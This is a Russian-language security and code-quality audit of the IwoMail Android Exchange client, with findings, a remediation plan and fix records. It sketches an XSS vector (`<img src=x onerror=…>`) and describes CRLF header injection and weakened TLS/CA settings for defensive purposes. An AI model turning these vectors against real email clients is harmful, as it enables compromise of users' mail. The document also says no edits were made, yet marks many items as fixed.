# Аудит кода IwoMail (v1.6.3b)

Дата: 2026-06-29
Метод: ручной построчный анализ ключевых слоёв + интернет-верификация фактов протокола EAS (MS-ASCMD / MS-ASPROV / MS-NLMP по learn.microsoft.com).
Фокус: краши, гонки, утечки, нарушения логики, безопасность, производительность, DRY/KISS/SOLID. Целевой сервер — Exchange 2007 SP1/SP2 (EAS 12.1).

> Это **повторный аудит с нуля**, не опирающийся на находки прошлой (оборванной) сессии. Каждая находка верифицирована по текущему коду. Раздел «Опровергнутые находки» отдельно разбирает ложные тревоги прошлой сессии.

---

## Сводка

| Severity | Кол-во | Находки |
|---|---|---|
| Critical | 0 | — |
| High | ~~1~~ → 0 | прежняя H-1 **пересмотрена** (2026-07-01): CSP с nonce уже есть → реально Low. См. «Повторная углублённая верификация» |
| Medium | 3 + N-12 | Crash-resistance не во всех ViewModel (M-1, подтв.); **`ServiceWatchdogReceiver` мёртв на API 26+ (N-12, ГЛЮК)**; DRY `ContactRepository` (M-2 → Low); EWS NTLM `synchronized`+blocking (M-3, per-instance) |
| Low | 7 + N-1…N-14 | прежние Low подтверждены; **новые**: cc/bcc без валидации (N-1), `readBytes()` OOM (N-2), Subject folding (N-3), `parseEwsDateTime` смещение (N-4), дубль MIME-извлечения (N-5), `EasClient` God-object (N-6), гонка `Mutex` кэша (N-7), `collectAsState` legacy (N-8), мёртвый `getEmailsByFolder` (N-9), `startForeground` без try/catch (N-10), дубль-отправка Outbox (N-11), NSC cleartext vs http (N-13), user-CA/FileProvider/alpha-крипто (N-14) |
| Опровергнуто | 3 | NTLM «stub»; XML-инъекция `deviceId`; «утечка» `clearAllEasClientCache` (все подтверждены как ложные) |

Общий вывод: **протокольный и sync-слой реализованы качественно и устойчиво.** ~~Главная реальная проблема — безопасность рендеринга HTML письма.~~ **Уточнение (2026-07-01):** H-1 понижена до Low (CSP с nonce уже есть). Самые предметные реальные пункты — **N-12** (мёртвый watchdog, ГЛЮК), **M-1** (краш VM) и **N-11** (дубль письма). Приоритеты, сложность и поэтапный план — в разделе «Приоритизация и план» ниже.

---

## Приоритизация и поэтапный план (2026-07-01)

**Легенда.** Сложность: `Trivial` (минуты) · `S` (≤1ч) · `M` (несколько часов) · `L` (рефакторинг). Важность: `Крит.` · `Выс.` · `Сред.` · `Низ.` Статус: `[ ]` не сделано.

| ID | Проблема | Sev | Сложность | Важность | Этап |
|---|---|---|---|---|---|
| M-1 | Краш в mutation-функциях 5 ViewModel (нет try/catch §10) | Medium | S | Выс. | 1 ✅ |
| N-12 | `ServiceWatchdogReceiver` мёртв на API 26+ (push-watchdog не работает) | Medium | S | Выс. | 1 ✅ |
| N-2 | OOM: все вложения в память до проверки лимита | Low-Med | S–M | Сред.–Выс. | 1 ✅ |
| N-10 | `PushService.startForeground` без try/catch (краш Android 12+) | Low | Trivial | Сред. | 1 ✅ |
| N-11 | Дубль-отправка `OutboxWorker` при retry (нет стабильного ClientId) | Low-Med | M | Выс. | 2 ✅ |
| L-3 | Редактор `RichTextEditor`: JS без CSP, `stripDangerousTags` не режет `on*=` | Low | S | Сред. | 2 ✅ |
| L-5 | Кастомный серт: hostname off + system-fallback (MITM opt-in) | Low | M | Сред. | 2 |
| N-7 | Гонка lifecycle `Mutex` в кэше `EasClient` | Low | S | Низ. | 2 ✅ |
| N-13 | ✅ NSC `cleartext=false` vs опция `useHttps=false` — исправлено | Low | S | Низ. | ✅ |
| N-1 | ✅ Протокол не валидирует cc/bcc (UI митигирует) — исправлено | Low | Trivial | Низ. | ✅ |
| N-3 | ✅ Subject — один encoded-word без сворачивания (RFC 5322) — исправлено | Low | S | Низ. | ✅ |
| N-4 | ✅ `parseEwsDateTime` теряет смещение таймзоны — исправлено | Low | S | Низ. | ✅ |
| N-5 | ✅ Дублированное извлечение inline-картинок MIME (DRY) — исправлено | Low | M | Низ. | ✅ |
| N-6 | `EasClient` God-object (SRP) | Low | L | Низ. | 3 |
| N-8 | ✅ `collectAsState` в legacy-экранах (энергопотребление) — исправлено | Low | S | Низ. | ✅ |
| N-9 | ✅ Мёртвый `getEmailsByFolder` — удалён | Low | Trivial | Низ. | ✅ |
| N-14 | user-CA trust / FileProvider `path="/"` / alpha-крипто | Low | S | Низ. | 3 |
| L-1 | ✅ Мёртвый `clearAllEasClientCache` — удалён | Low | Trivial | Низ. | ✅ |
| L-2 | ✅ Мёртвый `RepositoryProvider.clear` — удалён | Low | Trivial | Низ. | ✅ |
| L-4 | ✅ `deleteDuplicateEmails` — коллизия ключа группировки — исправлено | Low | S | Низ. | ✅ |
| L-6 | TLS 1.0/слабые шифры глобально (by-design Exchange 2007) | Low | M | Низ. | 3 / wontfix |
| L-7 | XOR-fallback паролей (fail-closed / уведомление) | Low | M | Низ. | 3 |
| M-2 | ✅ `ContactRepository` в обход провайдера (DRY) — исправлено | Low | Trivial | Низ. | ✅ |
| M-3 | EWS NTLM `synchronized`+blocking (per-account) | Low | M | Низ. | 3 |
| H-1 | ~~WebView XSS~~ — пересмотрено (CSP есть) → инфо | Low | — | — | — |

**Этап 1 — реальные пользовательские дефекты, дёшево (сделать первыми): ✅ СДЕЛАНО (2026-07-01).**
`M-1` (краш), `N-12` (мёртвый watchdog → деградация Push), `N-2` (OOM на вложениях), `N-10` (краш FGS Android 12+).
Реализация (best-practice, интернет-верифицировано):
- **M-1** — паттерн §10 (`try/catch(CancellationException){throw}/catch(Exception){Error}`) во всех mutation-функциях Notes/Search/Tasks/UserFolders; в SyncCleanup — DRY-хелпер `launchSafe`. Loading/selection-флаги сброшены в `finally`. Покрыто 15 юнит-тестами crash-resistance.
- **N-10** — `androidx.core.app.ServiceCompat.startForeground` в try/catch, при неудаче `stopSelf()`+`START_NOT_STICKY`.
- **N-12** — ресивер зарегистрирован ДИНАМИЧЕСКИ в `MailApplication` (`ContextCompat.registerReceiver`, `RECEIVER_NOT_EXPORTED`), мёртвый manifest-`<receiver>` удалён; рестарт через exemption-safe `PushService.requestRestart` (exact-alarm + `getForegroundService` + WorkManager), вынесен в static (DRY с `scheduleRestart`).
- **N-2** — пред-проверка суммарного размера вложений (`ContentResolver`, лимит 10 МБ = строка `attachmentLimitExceeded`) ДО `readBytes`; тост при превышении.
- Тесты: `testOptions.unitTests.isReturnDefaultValues = true` (best-practice для `android.util.Log` в юнит-тестах). Сборку выполняет разработчик в Android Studio.

**Этап 2 — надёжность/безопасность, средняя цена. `L-3`+`N-7`+`N-11` ✅ СДЕЛАНО (2026-07-01); `L-5` отложен (высокий риск, отдельно).**
- **L-3** — `stripDangerousTags` теперь делегирует в `sanitizeEmailHtml` (DRY: убрана дублировавшая script/iframe/… regex-логика; добавлено вырезание `on*=`/`javascript:` на Kotlin-стороне) + `<base>`/`<link>`; в `editorHtml` добавлен CSP `script-src 'nonce-…'` (nonce на собственном скрипте редактора; блокирует внедрённые обработчики, в т.ч. на пути **вставки/paste**, который JS-санитайзер не покрывал). **Важно:** JS-side `sanitizeHtml` в редакторе УЖЕ резал `on*=`/`javascript:` через detached-div (аудит это упустил) — XSS был закрыт; фикс — DRY + defense-in-depth (CSP). Юнит-тест `RichTextEditorSanitizeTest`.
- **N-7** — `clearEasClientCache` больше не удаляет `Mutex` из `easClientLocks`; `tryFallbackToAlternate` мутирует кэш под тем же per-account `Mutex`, что и `createEasClient`. Гонка «двух корутин в критической секции» закрыта. (Проверено ревью — юнит-тест гонки непрактичен без Robolectric.) **Новая находка при ревью:** у `PushService` — ОТДЕЛЬНЫЙ `easClientCache` (synchronizedMap) с рассинхроном: `keys.toList()` (стр. ~517) без `synchronized` → возможен `ConcurrentModificationException`; `remove+put` в fallback без атомарности. Это НЕ N-7 (другой кэш) — кандидат в Этап 3.
- **N-11** — стабильный `ClientId` на запись `outbox.json` (`OutboxWorker`), переиспользуется при retry; протянут в `EasClient.sendMail`→`EasEmailService.sendMail`→`buildMimeMessageBytes` (MIME `Message-ID`) и `generateSendMail` (WBXML `ClientId`). **EAS 14+**: сервер отбрасывает дубль по `ClientId` — полное решение. **Exchange 2007 (12.1)**: интернет-верифицировано (MS-ASCMD) — `SendMail` = raw MIME без `ClientId`, серверной дедупликации нет → стабильный `Message-ID` это best-effort; полный клиентский Sent-check вынесен в follow-up (риск потери письма — делать осторожно). Обратно-совместимо (старые записи без `clientId` → прежнее поведение).

**Этап 3 — DRY/SOLID/best-practice/чистка (при рефакторинге): частично ✅ СДЕЛАНО (2026-07-01).**
- **L-1** — удалён мёртвый `AccountRepository.clearAllEasClientCache()` (0 вызовов).
- **L-2** — удалён мёртвый `RepositoryProvider.clear()` (0 вызовов; репозитории — app-wide singletons на `applicationContext`, чистка при смене аккаунта не требуется).
- **N-9** — удалён мёртвый `EmailDao.getEmailsByFolder` (Flow, без `LIMIT`, 0 вызовов; список читает body-less `getEmailSummariesByFolder`). Живые `getEmailsByFolderList`/`getEmailsByFolderPaged` сохранены.
- **M-2** — 3 прямых `ContactRepository(context)` → `RepositoryProvider.getContactRepository(context)` (`InitialSyncController`, `ContactsScreen`, `ComposeScreen`); неиспользуемые импорты `ContactRepository` удалены. DRY-единообразие с `getAccountRepository`/`getMailRepository`.
- **N-15** — `PushService.easClientCache` → `ConcurrentHashMap` (weakly-consistent итерация без `ConcurrentModificationException`, атомарные `get`/`computeIfAbsent`, снят ручной `synchronized` и лишний `remove` перед `put`).
- **N-1** — общий `stripHeaderCrlf` вырезает CR/LF из адресных/Message-ID заголовков во всех трёх путях MIME-сборки (`appendMimeHeaders`, meeting-invite, `buildMdnMessage`). Закрывает инъекцию заголовков MDN недоверенными данными входящего письма. Тест `EasMimeHeaderSanitizeTest`.
- **N-3** — Subject кодируется через новый `encodeMimeHeaderText` (RFC 2047 folding: encoded-word'ы ≤75 октетов, CRLF+SPACE, целые UTF-8 символы, строка ≤76). Единый источник `mimeEncodedWord`/`chunkByUtf8Bytes` для всех 4 мест `=?UTF-8?B?…?=` (3 Subject + имя вложения; имя — без folding, encoded-word в quoted-параметре по RFC 2047 §5). Короткая тема → один encoded-word (без изменений). Тест `EasMimeSubjectEncodingTest`.
- **L-4** — ключ дедупликации `deleteDuplicateEmails` переведён на канонический `internetMessageId` (RFC 5322 Message-ID глобально уникален → удаляются только настоящие дубли); письма без Message-ID не трогаются. Флаг `duplicates_cleaned_v35` не бампался (правка убирает латентный дефект дремлющего запроса, повторный прогон не нужен).

- **N-13** — для Exchange-аккаунтов форсируется HTTPS: убрана нерабочая HTTP-опция в `SetupScreen` (cleartext-EAS блокируется NSC), `useSSL` форсируется на save-путях (правка и новый Exchange). IMAP/POP3 (cleartext через JavaMail, мимо NSC) не тронуты.
- **N-5** — единый источник извлечения inline-картинок: `EasEmailService.extractInlineImagesFromMime` делегирует в `MimeHtmlProcessor`; дублировавшая рекурсия и регексы удалены. В `MimeHtmlProcessor` добавлен guard глубины рекурсии (устраняет и латентную бесконечную рекурсию на части-преамбуле). Тест `MimeHtmlProcessorInlineImageTest`.

- **N-8** — все legacy-экраны переведены с `collectAsState` на `collectAsStateWithLifecycle` (сбор Flow ставится на паузу в STOPPED — экономия CPU/батареи в фоне/бэкстеке): `MainActivity`, `MainScreen`, `MainScreenDrawer`, `ServerStatusBanner`, `Personalization`/`Settings`/`Contacts`/`Calendar`/`AccountSettings`/`Updates`/`ContactDetailsDialog` + остаточный `activeAccount` в `EmailDetailScreen`. Плоских `collectAsState` в проекте не осталось.

Остаются (Этап 3): `N-4`/`N-6`/`L-5`/`L-6`/`L-7`/`M-3` — по мере рефакторинга.

> Правки НЕ внесены (по запросу — только аудит). Этот план — дорожная карта для последующих коммитов.

---

## Повторная углублённая верификация (2026-07-01)

Метод: построчное чтение реального кода + footgun-свип всего проекта (PendingIntent, SimpleDateFormat, CoroutineScope/leak, `readBytes`, registerReceiver, runBlocking/GlobalScope/lateinit) + интернет-верификация протокола (EAS-версии Exchange 2007, MS-ASWBXML, MS-ASHTTP по learn.microsoft.com). Каждая находка перепроверена по коду.

### A. Исправления к находкам прошлого аудита

**H-1 — ПЕРЕСМОТРЕНА: High → Low.** Центральная посылка «единственный барьер — `sanitizeEmailHtml()` на regex» **неверна**. В `EmailDetailScreen.kt:1691` (внутри `update`-лямбды `AndroidView`, ~130 строк ниже процитированного в H-1 замера высоты) в `<head>` каждого письма инжектится:
`<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'nonce-$nonce'; style-src 'unsafe-inline'; img-src data: cid: https: http: blob:; font-src https: data:;">`
`nonce` — случайный `UUID.randomUUID()` на каждую загрузку (стр. 1686). `script-src 'nonce-…'` **без** `'unsafe-inline'` по спецификации CSP блокирует ровно описанные в H-1 векторы: inline-обработчики `onerror`/`onload` и `javascript:`-URI. Атакующий не угадает nonce и не ослабит CSP своим `<meta>` (политики комбинируются на ужесточение). Regex-санитайзер — defense-in-depth позади CSP. Рекомендация H-1 «внедрить CSP» **уже выполнена**. Остаточный риск Low (доверие к meta-CSP в WebView; `img-src` допускает http/https — но без исполнения JS эксфильтрации тела письма нет).

**L-3 — риск ИНВЕРТИРОВАН.** Редактор `RichTextEditor` — **более слабая** поверхность, чем просмотрщик письма: (1) CSP в нём **нет** (grep: CSP только в `EmailDetailScreen.kt:1691`); (2) `stripDangerousTags` (`RichTextEditor.kt:194-205`) вырезает теги `script/iframe/object/embed/applet/base/link`, но **НЕ** обработчики `on*=`. Поэтому `<img src=x onerror=…>` из цитируемого письма теоретически исполнится в редакторе. Смягчение: JS-интерфейс (`RichTextEditor.kt:963-991`) безвреден (`cacheHtml`/`onHtmlChanged`/`onFormatStateChanged`), `allowFileAccess=false`, `baseURL=null` → импакт Low. **Вывод: H-1 переоценён (CSP есть), L-3 недооценён (CSP нет).**

**M-2 — Medium → Low.** 3 прямых `ContactRepository(context)` подтверждены (`ContactsScreen.kt:74`, `ComposeScreen.kt:320`, `InitialSyncController.kt:322`), но это чистый DRY/косметика (singleton `MailDatabase`, контекст не удерживается — не утечка). Severity Medium завышена.

**M-3 — уточнение.** `ntlmLock` (`EwsClient.kt:31`) — **per-instance** (`EwsClient` создаётся per-account), а не глобальный статический. Сериализует EWS-NTLM в пределах аккаунта; импакт Low (EWS — fallback-путь Exchange 2007). Формулировка сводки «глобальным `synchronized`» неточна; тело находки корректно.

**F-2 — вывод верен, механизм описан неточно.** `generateStableDeviceId` (`EasClient.kt:407-412`) использует `String.format("%010d", hash)`, а не `takeLast(15)/takeLast(8)`. Результат тот же — `androidc`+10 цифр, XML-инъекция невозможна.

**M-1 — ПОДТВЕРЖДЕНА, с градацией риска.** Самый реальный краш-путь — `SyncCleanupViewModel.set*` (`SyncCleanupViewModel.kt:102-196`): вызывают `accountRepo.update*` (raw Room, возвращают `Unit`) + `effects.rescheduleSync()` (WorkManager) **вообще без `catch`** → `SQLiteException`/исключение планировщика уронит процесс. `Notes`/`Tasks`/`UserFolders` частично прикрыты `EasResult`, но всё равно нарушают обязательный паттерн `ARCHITECTURE.md §10` в mutation-функциях.

### B. Новые находки

**N-1 (Low, defense-in-depth). Протокольный `sendMail`/`smartForward` валидируют только `to`, не `cc`/`bcc`.**
`EasEmailService.kt:177` проверяет `isValidEmailAddress(to)`, но `cc`/`bcc` идут в `appendMimeHeaders` (`EasXmlTemplates.kt:590-592`) сырыми: `append("Cc: $cc\r\n")`. CRLF в `cc`/`bcc` → инъекция MIME-заголовков. **На практике НЕ достижимо:** UI `normalizeRecipients` (`ComposeScreen.kt:207-223`) извлекает только email-подстроку через `emailRegex.find().value`, отбрасывая `\r\n`. Но протокольный слой полагается на санитайзинг UI — несогласованная валидация (нарушение DIP/SOLID). Рекомендация: валидировать `cc`/`bcc` как `to` и/или вырезать CR/LF в `appendMimeHeaders`. `subject` безопасен (Base64-кодируется, стр. 594-597).

**✅ ИСПРАВЛЕНО (2026-07-01):** введён общий `internal fun String.stripHeaderCrlf()` (`EasXmlTemplates.kt`) — вырезает CR/LF из значений заголовков. Применён во ВСЕХ трёх путях сборки MIME-заголовков (DRY): `appendMimeHeaders` (From/To/Cc/Bcc + `Return-Receipt-To`/`Disposition-Notification-To`/`X-Confirm-Reading-To`), meeting-invite MIME (`EasClient.kt`), и — важнее всего — `buildMdnMessage` (`EasAttachmentService.kt`), где `To`/`In-Reply-To`/`References`/`Original-Message-ID`/`Final-Recipient` берутся из **входящего** письма (недоверенные). Юнит-тест `EasMimeHeaderSanitizeTest`. iCal `ORGANIZER`/`ATTENDEE` (`EasClient.kt:2082/2084`) — самоавторские (отправитель вводит своих участников), однострочный UI-ввод, другой RFC (5545) → вне scope N-1.

**N-2 (Low-Medium, перф/OOM). Чтение вложений целиком в память + лимит проверяется СЛИШКОМ ПОЗДНО.**
11 мест `readBytes()`: `ComposeScreen.kt:720/889/1079/1238/1476/1503`, `EmailDetailActions.kt:52`, `EmailSyncService.kt:1790`, `ScheduledEmailWorker.kt:83`, `ComposeUtils.kt:238`, `CreateEventDialog.kt:164`. При отправке `ComposeScreen.sendEmail` (стр. 1500-1510) читает **ВСЕ** вложения в память одновременно (`attachments.mapNotNull { …readBytes()… }` → `List<AttachmentData>`, каждый держит полный `ByteArray`), затем MIME Base64 (+33%) и WBXML opaque → пик ≈ 2–3× суммы размеров, всё резидентно. **Лимит 7 МБ существует** (`EasAttachmentService.kt:68-71`), но проверяется в протокольном слое ПОСЛЕ загрузки всех байт — вложения хранятся как URI до отправки, поэтому файл 200 МБ уронит процесс на `readBytes()` ещё ДО срабатывания лимита. Рекомендация: проверять суммарный `estimatedSize`/метаданные URI ДО чтения (при добавлении или в начале `sendEmail`); потоковая обработка.

**N-3 (Low, robustness). Subject — один RFC 2047 encoded-word без сворачивания.**
`appendMimeHeaders` (`EasXmlTemplates.kt:594-597`): `Subject: =?UTF-8?B?<base64>?=` одной строкой. Очень длинная тема → строка заголовка > 998 октетов (RFC 5322 §2.1.1), что строгие шлюзы могут отклонять (Exchange обычно толерантен). Рекомендация: сворачивать длинные encoded-words на несколько строк.

**✅ ИСПРАВЛЕНО (2026-07-01):** введён `encodeMimeHeaderText` (`EasXmlTemplates.kt`) — RFC 2047 folding через `chunkByUtf8Bytes(text, 36)` + `mimeEncodedWord`: encoded-word'ы ≤75 октетов, разделитель CRLF+SPACE (декодер склеивает, §8), UTF-8 символы не разрываются (§5), строка `Subject: …` ≤76. Применён во всех 3 Subject-путях (`appendMimeHeaders`, meeting-invite `EasClient`, MDN `EasAttachmentService`); имя вложения переведено на `mimeEncodedWord` (DRY, БЕЗ folding — encoded-word в quoted-параметре, §5 запрещает многословность/quoted-string). Короткая тема → один encoded-word (без изменений). Интернет-верифицировано ([RFC 2047](https://www.rfc-editor.org/rfc/rfc2047)). Тест `EasMimeSubjectEncodingTest`.

**N-4 (Low, корректность времени). `parseEwsDateTime` отбрасывает смещение таймзоны.**
`CalendarDateUtils.kt:85-98` regex'ом удаляет `[+-]\d{2}:\d{2}$` и парсит как UTC. Если EWS вернёт время со смещением (а не `Z`), смещение теряется → сдвиг времени. Для Exchange 2007 SP1 EWS отдаёт UTC с `Z`, поэтому почти не триггерится. Рекомендация: учитывать смещение при парсинге.

**✅ ИСПРАВЛЕНО (2026-07-01):** смещение больше не выбрасывается — при наличии `Z` или `±HH:MM` парсим паттерном `XXX` (Java 7+, парсит и `Z`→UTC, и `±HH:MM`; интернет-верифицировано по [Oracle SimpleDateFormat](https://docs.oracle.com/javase/8/docs/api/java/text/SimpleDateFormat.html)). Без зоны — трактуем как UTC (поведение EWS по умолчанию). Доли секунды по-прежнему убираются. Тест `CalendarDateUtilsTest` (регрессия: `13:30+03:00` == `10:30Z`).

**N-5 (Low, DRY/SOLID). Дублированное извлечение inline-картинок из MIME.**
Две живые почти идентичные рекурсивные реализации: `EasEmailService.extractInlineImagesFromMime`+`extractImagesRecursive` (`EasEmailService.kt:631/651`, протокольный путь, зовётся из `EasClient.kt:1003/1025`) и `MimeHtmlProcessor.extractInlineImagesFromMime`+`extractImagesRecursive` (`MimeHtmlProcessor.kt:67/201`, UI-путь, зовётся из `EmailDetailActions.kt:154`). Алгоритм (обход вложенных multipart, `BOUNDARY`-regex, CID→data:URL) продублирован и **уже разошёлся** (`MimeHtmlProcessor` сначала зовёт `decodeMimeWrapper`, `EasEmailService` — нет) → правка в одном не попадёт в другой. Примечательно: `extractHtmlFromMime` централизован в `MimeHtmlProcessor` (зовётся из обоих) — а извлечение картинок не довели. Рекомендация: единый источник в `MimeHtmlProcessor`.

**✅ ИСПРАВЛЕНО (2026-07-01):** `EasEmailService.extractInlineImagesFromMime` теперь делегирует в `MimeHtmlProcessor.extractInlineImagesFromMime` (единый источник, как `extractHtmlFromMime`); дублировавшие `extractImagesRecursive` и регексы (`BOUNDARY_REGEX`/`CONTENT_ID_PATTERN`/`CONTENT_TYPE_IMAGE_PATTERN`) удалены. Регексы были верифицированы идентичными (`EasPatterns.BOUNDARY` == MimeHtmlProcessor.BOUNDARY и т.д.) → поведение сохранено; `decodeMimeWrapper` — безопасный no-op для сырого MIME. В `MimeHtmlProcessor.extractImagesRecursive` добавлен guard `depth>10` (у EAS-версии он был, у UI-версии — нет → латентная бесконечная рекурсия на части-преамбуле, содержащей `boundary=`/`multipart/` без разделителя). Тест `MimeHtmlProcessorInlineImageTest`.

**N-6 (Low, SOLID/архитектура). `EasClient` (2713 строк, ~80 публичных методов) — частичный God-object.**
Большинство методов — тонкая делегация в feature-сервисы (`= emailService.X`/`= transport.X`), но часть несёт существенную inline-логику (`fetchEmailBodyViaEws` ~774-1000, `parseEmail` 1331-1404, EWS/MIME-парсинг), которая по SRP должна жить в сервисах. Это осознанный facade (`ARCHITECTURE.md §10`), но смешение «делегация + логика» — реальный SRP-запах и широкая поверхность. Низкий приоритет (не баг).

**N-7 (Low, гонка/конкурентность). Жизненный цикл `Mutex` в кэше `EasClient` нарушает взаимное исключение.**
`AccountRepository.kt`: (а) `clearEasClientCache` (586-591) удаляет per-account `Mutex` из `easClientLocks` **во время возможного удержания** другим `createEasClient` (стр. 474 `mutex.withLock`); следующий `createEasClient` через `computeIfAbsent` создаст **другой** экземпляр `Mutex` → две корутины одновременно входят в критическую секцию. (б) `tryFallbackToAlternate` (531-580) пишет `easClientCache[accountId]` (стр. 577) **вообще без мьютекса**, гонясь с `createEasClient`. Итог: редкое создание/перезапись лишнего `EasClient` (last-writer-wins). **Импакт низкий:** OkHttp-пул общий (нет утечки соединений), краша/потери данных нет; но это настоящие гонки. Рекомендация: не удалять `Mutex` при инвалидации (чистить только клиент), все мутации кэша — под одним per-account `Mutex` (включая `tryFallbackToAlternate`).

**N-8 (Low/информационно, энергопотребление). Legacy-экраны используют `collectAsState` вместо `collectAsStateWithLifecycle`.**
7 мигрированных ViewModel-экранов (EmailDetail/EmailList/Tasks/Notes/Search/UserFolders/SyncCleanup) используют `collectAsStateWithLifecycle` (пауза сбора в STOPPED — верно). Немигрированные (`MainScreen` ×5, `MainActivity` ×8, `Calendar/Contacts/Settings/AccountSettings/Personalization`) — плейн `collectAsState`, поэтому Flow'ы (accounts/activeAccount/lastSyncTime/settings) продолжают собираться в фоне/бэкстеке → мелкая трата CPU/батареи (важно для приложения с акцентом на энергосбережение). Импакт низкий (эмиссии редки). Устраняется по мере инкрементальной MVVM-миграции (`ARCHITECTURE.md §2.1`).

**✅ ИСПРАВЛЕНО (2026-07-01):** все legacy-экраны переведены на `collectAsStateWithLifecycle` (импорт `androidx.lifecycle.compose`, зависимость `lifecycle-runtime-compose:2.7.0` уже была). `initial =` → `initialValue =`. Плоских `.collectAsState(` в проекте не осталось (grep). Семантика сохранена: тот же initial, последнее значение удерживается в фоне, StateFlow/Room переиздают при возврате в STARTED.

**N-9 (Low, мёртвый код). `EmailDao.getEmailsByFolder` не используется.**
`Daos.kt:204-205` — `SELECT * FROM emails WHERE folderId … ORDER BY dateReceived DESC` (полный `body`, без `LIMIT`), `Flow<List<EmailEntity>>`. 0 вызовов (grep): список писем использует body-less `getEmailSummariesByFolder`. Мёртвый код в духе L-1/L-2. Опасность лишь потенциальная — если его когда-нибудь подключат к UI, он загрузит все тела без лимита. Удалить.

**✅ ИСПРАВЛЕНО (2026-07-01):** метод удалён. `getEmailsByFolderList` (suspend, 5 вызовов из `EmailSyncService`) и `getEmailsByFolderPaged` — сохранены (живые).

**N-10 (Low, robustness Android 12+). `startForeground` в `PushService` без try/catch.**
`PushService.kt:325-328` (`onStartCommand`) вызывает `startForeground(…, FOREGROUND_SERVICE_TYPE_DATA_SYNC)` без обёртки. На Android 12+ это может бросить `ForegroundServiceStartNotAllowedException`, если сервис доставлен в состоянии без валидного FGS-исключения (истёк exact-alarm exemption, нестандартная доставка `START_STICKY` с null-intent). Вероятность низкая (все штатные вызовы — под исключениями: BootReceiver/exact-alarm/foreground), но краш реален и `START_STICKY` может дать рестарт-churn. Документация Android явно рекомендует ловить это исключение. **Несогласованность:** соседний `SyncWorker.kt:59-64` уже оборачивает `setForeground` в try/catch («Игнорируем ошибку — продолжаем в фоне») — тот же паттерн просто не применён к `PushService`. Рекомендация: обернуть `startForeground` в try/catch, при неудаче — `stopSelf()`.

**N-11 (Low-Medium, надёжность/дубль-отправка). `OutboxWorker` может отправить письмо дважды при retry.**
`OutboxWorker.kt:189-208`: если `sendMail` вернул `Error` — включая **потерю ответа после того, как сервер уже принял письмо** (обрыв сети после доставки) — письмо уходит в `failedEmails` → `Result.retry()` → повторная отправка. Каждый `sendMail` строит **новый** Message-ID (`buildMimeMessageBytes`: `<${currentTimeMillis}.${nanoTime}@deviceId>`) и новый ClientId; в очереди (JSON) стабильный идентификатор НЕ хранится. Для **Exchange 2007 (основная цель)** отправка идёт raw-MIME без серверной дедупликации → retry после потерянного ответа доставит **дубликат**. Для EAS 14+ стабильный `ClientId` позволил бы серверу дедуплицировать (MS-ASCMD §2.2.3.32), но приложение генерирует его заново. Окно узкое (принято сервером, но ответ потерян), импакт — дубль письма (не потеря данных). Рекомендация: хранить стабильный `ClientId`/Message-ID на запись очереди и переиспользовать при retry.

**N-12 (Medium, ГЛЮК — мёртвый компонент). `ServiceWatchdogReceiver` никогда не срабатывает на API 26+.**
`AndroidManifest.xml:187-196` декларирует ресивер для `ACTION_USER_PRESENT` / `ACTION_SCREEN_ON` / `ACTION_POWER_CONNECTED`, но при `minSdk=26`: `SCREEN_ON` в принципе **не регистрируется** через манифест (только `registerReceiver`), а `USER_PRESENT` и `POWER_CONNECTED` — implicit-бродкасты, **не входящие в exemption-list** Android 8+ → манифест-ресивер молча не получает их (интернет-верифицировано: learn/developer.android.com «Implicit broadcast exceptions»). Рантайм-регистрации нет (grep: единственный `registerReceiver` в `SettingsRepository:278` — другой ресивер). **Итог: watchdog PushService (быстрый рестарт при разблокировке/зарядке) полностью нефункционален.** Смягчение: есть другие механизмы восстановления (`START_STICKY`, `SyncAlarm`, `SyncWorker.checkAndStartPushService`, `BootReceiver`), поэтому push не «мёртв», но быстрое восстановление по screen-on потеряно. Рекомендация: регистрировать ресивер динамически (`registerReceiver` в `PushService.onCreate`/`MailApplication`) для `SCREEN_ON`/`USER_PRESENT`/`POWER_CONNECTED`, либо удалить компонент как мёртвый.

**N-13 (Low, несогласованность конфига). NSC `cleartextTrafficPermitted="false"` конфликтует с опцией `useHttps=false`.**
`network_security_config.xml:3` запрещает cleartext, но `EasClient.buildUrl` строит `http://` при `useHttps=false` (`scheme = if (useHttps) "https" else "http"`). Для EAS через OkHttp такое соединение будет заблокировано `CleartextNotPermittedException`. То есть опция «без SSL» для Exchange фактически нерабочая (для IMAP/POP3 через JavaMail NSC не применяется — там cleartext пройдёт, что тоже несогласованно). Рекомендация: либо убрать/задизейблить не-SSL для Exchange, либо разрешить cleartext точечно для сконфигурированного хоста через `domain-config`.

**✅ ИСПРАВЛЕНО (2026-07-01):** выбран первый вариант (NSC — осознанная security-политика, HTTP-EAS на практике не встречается). HTTP-опция протокола убрана из `SetupScreen` для Exchange (была нерабочей); `useSSL` форсируется в `true` для `AccountType.EXCHANGE` на обоих save-путях (правка существующего аккаунта и новый Exchange → `VerificationScreen`). Так конфиг и UI согласованы (Exchange = HTTPS-only). IMAP/POP3 не тронуты — там не-SSL работает через JavaMail (мимо NSC) и остаётся легитимной опцией. `domain-config` для динамического пользовательского хоста статическим XML невозможен, поэтому не применялся.

**N-14 (Low, best-practice конфиг). Ослабленные конфиги: user-CA trust, широкий FileProvider, alpha-крипто.**
(а) `network_security_config.xml:8` `<certificates src="user"/>` — доверие пользовательским CA глобально для всех соединений (со времён Android 7 best-practice — НЕ доверять user-CA; расширяет MITM-поверхность). Осознанный компромисс ради self-signed Exchange, но шире необходимого (см. L-5). (б) `file_paths.xml:8` `<cache-path name="cache" path="/"/>` — весь cache-каталог доступен через FileProvider (over-broad; лучше скоупить конкретные подпапки). (в) `build.gradle.kts:145` `androidx.security:security-crypto:1.1.0-alpha06` — **alpha**-зависимость на пути шифрования паролей в проде (риск стабильности/поддержки). Все три — низкий приоритет, но best-practice.

**N-15 (Low, гонка — найдено при ревью N-7). Рассинхрон отдельного кэша `easClientCache` в `PushService`.**
`PushService.kt` имеет СВОЙ `easClientCache = Collections.synchronizedMap(...)` (стр. 56), отдельный от `AccountRepository`. Часть доступов синхронизирована (`synchronized(easClientCache) { getOrPut }`, стр. 835-839), часть — нет: `easClientCache.keys.toList()` (стр. ~517) без внешней синхронизации → при конкурентной модификации возможен `ConcurrentModificationException` (краш); `remove`+`put` в `tryPushFallback` (769-770) — неатомарный compound (смягчено сериализацией ping-петли per-account). Не входит в N-7 (тот про `AccountRepository`). Рекомендация: обернуть итерацию `keys` в `synchronized(easClientCache)`; compound-мутации — тоже. Этап 3.

